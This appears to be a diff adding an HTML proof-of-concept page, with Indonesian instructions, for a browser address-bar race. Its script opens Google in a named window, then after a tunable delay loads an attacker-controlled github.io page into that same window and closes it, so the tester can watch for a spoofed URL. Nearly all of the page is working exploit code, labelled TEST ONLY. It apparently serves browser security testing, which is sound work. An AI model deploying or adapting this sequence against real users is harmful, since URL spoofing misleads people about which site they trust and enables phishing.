@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>PoC Sequence — TEST ONLY</title>
+<style>
+  body{font-family:system-ui,Segoe UI,Roboto,Arial;background:#f6f8fb;padding:18px}
+  .card{max-width:900px;margin:0 auto;background:#fff;padding:16px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.06)}
+  button{padding:10px 14px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
+  .warn{background:#ff6b6b}
+  label{margin-right:12px}
+  #log{white-space:pre-wrap;background:#0b1220;color:#e6f0ff;padding:12px;border-radius:8px;margin-top:12px;max-height:260px;overflow:auto}
+  .badge{display:inline-block;padding:4px 8px;border-radius:6px;background:#111;color:#fff;margin-left:8px;font-size:12px}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h2>PoC Sequence — Address Bar Race (TEST ONLY)</h2>
+    <p><strong>Note:</strong> Jalankan hanya di lingkungan uji. PoC ini menunjukkan urutan: <em>open google → after delayInject open attacker (same window name) → after delayClose close window (return focus)</em>.</p>
+
+    <div style="margin:10px 0">
+      <label>delayInject (ms): <input id="delayInject" type="number" value="300" style="width:90px"></label>
+      <label>delayClose (ms): <input id="delayClose" type="number" value="2000" style="width:90px"></label>
+      <button id="run">Run Sequence</button>
+      <button id="abort" class="warn">Abort/Reset</button>
+      <span class="badge">TEST ONLY</span>
+    </div>
+
+    <p>Instruksi singkat: Tekan <strong>Run Sequence</strong>. Jendela baru akan terbuka yang pertama ke Google, lalu attacker, lalu ditutup. Amati behavior address bar & konten pada jendela yang terbuka (rekam layar bila perlu).</p>
+
+    <div id="log">LOG: ready</div>
+  </div>
+
+<script>
+  const runBtn = document.getElementById('run');
+  const abortBtn = document.getElementById('abort');
+  const logEl = document.getElementById('log');
+
+  let winRef = null;
+  let timers = [];
+
+  function log(s){
+    const t = new Date().toISOString().slice(11,23);
+    logEl.textContent += `\n[${t}] ${s}`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function clearTimers(){
+    timers.forEach(t=>clearTimeout(t));
+    timers = [];
+  }
+
+  runBtn.addEventListener('click', () => {
+    clearTimers();
+    log('=== Sequence START ===');
+    const delayInject = Math.max(0, parseInt(document.getElementById('delayInject').value||"300",10));
+    const delayClose  = Math.max(0, parseInt(document.getElementById('delayClose').value||"2000",10));
+
+    // Step 1: open google in named window 'x'
+    try {
+      winRef = window.open('https://www.google.com/', 'x');
+      if (!winRef) { log('window.open returned null (popup blocked).'); return; }
+      log('opened https://www.google.com/ in window name "x"');
+    } catch(e){
+      log('window.open ERROR: ' + e);
+      return;
+    }
+
+    // Step 2: after delayInject, open attacker in same window name 'x'
+    timers.push(setTimeout(()=>{
+      try {
+        window.open('https://mohammedalqi.github.io/', 'x');
+        log(`after ${delayInject}ms: opened attacker https://mohammedalqi.github.io/ into same window "x"`);
+      } catch(e){
+        log('opening attacker ERROR: ' + e);
+      }
+    }, delayInject));
+
+    // Step 3: after delayInject + delayClose, close the opened window to return focus
+    timers.push(setTimeout(()=>{
+      try {
+        if (winRef && !winRef.closed) {
+          winRef.close();
+          log(`after ${delayInject + delayClose}ms: closed window "x" (returned focus to main page)`);
+        } else {
+          log('window already closed or unavailable to close');
+        }
+      } catch(e){
+        log('closing window ERROR: ' + e);
+      } finally {
+        log('=== Sequence END ===');
+      }
+    }, delayInject + delayClose));
+  });
+
+  abortBtn.addEventListener('click', () => {
+    clearTimers();
+    try { if (winRef && !winRef.closed) winRef.close(); } catch(e){}
+    winRef = null;
+    log('ABORT: timers cleared, window closed if present');
+  });
+</script>
+</body>
+</html>
